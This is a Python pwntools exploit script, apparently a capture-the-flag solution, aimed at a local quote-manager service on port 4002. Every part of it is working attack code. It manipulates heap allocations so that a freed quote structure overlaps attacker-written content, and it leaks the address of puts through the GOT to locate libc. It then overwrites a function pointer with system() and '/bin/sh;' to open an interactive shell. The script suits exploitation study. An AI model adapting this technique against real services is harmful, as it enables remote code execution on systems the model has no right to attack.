#!/usr/bin/python3
from pwn import remote, ELF, context, pack, unpack

context.arch = 'amd64'

libc = ELF('./libc.so.6')
puts_got_plt = 0x404020
sizeof_quote_t = 48

p = remote('127.0.0.1', 4002)

def list_quotes():
    p.sendlineafter("Choice number > ", "1")
    return p.recvuntil("\n-::")[:-4].split(b'\n')[:-1]

def add_quote(title, content, title_size = -1, content_size = -1):
    if content_size < 0:
        content_size = len(content)
    if title_size < 0:
        title_size = len(title)
    p.sendlineafter("Choice number > ", "2")
    p.sendlineafter("Title size > ", "%d" % title_size)
    p.sendlineafter("Content size > ", "%d" % content_size)
    p.sendlineafter("Title > ", title)
    p.sendlineafter("Content > ", content)

def get_quote(index, pwned=False):
    p.sendlineafter("Choice number > ", "3")
    p.sendlineafter("Quote number > ", "%d" % index)
    if not pwned:
        data = p.recvuntil("\n-::")
        title = data.split(b'\n[>]')[0].split(b'[+] ')[1]
        content = data.split(b'[>] ')[1].split(b'\n\n-:: ')[0][:-4]
        return {'content':content, 'title':title}

def edit_quote(index, content):
    p.sendlineafter("Choice number > ", "4")
    p.sendlineafter("Quote number > ", "%d" % index)
    p.sendlineafter("Content > ", content)

def delete_quote(index):
    p.sendlineafter("Choice number > ", "5")
    p.sendlineafter("Quote number > ", "%d" % index)

def exit_chall():
    p.sendlineafter("Choice number > ", "6")

def build_fake_quote(content_ptr, content_size, title_ptr, title_size, write_ptr, read_ptr):
    return pack(content_ptr) + pack(content_size) + pack(title_ptr) + pack(title_size) + pack(write_ptr) + pack(read_ptr)

add_quote("aaaaaaaa", "AAAAAAAA") #1
add_quote("bbbbbbbb", "BBBBBBBB") #2
add_quote("cccccccc", "CCCCCCCC") #3
add_quote("dddddddd", "DDDDDDDD") #4
delete_quote(1)
delete_quote(2)

add_quote("eeeeeeee", pack(puts_got_plt), 8, sizeof_quote_t) #2 #3 pointent vers la meme quote, notre content occupe la meme place sur la heap que #1

puts_leak = unpack(get_quote(1)['content'].ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']

print("[+] Libc base address : 0x%x" % libc.address)
print("[+] System address : 0x%x" % libc.symbols['system'])

edit_quote(2, build_fake_quote(unpack(b'/bin/sh;'), 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, libc.symbols['system']))
get_quote(1, True)

p.interactive()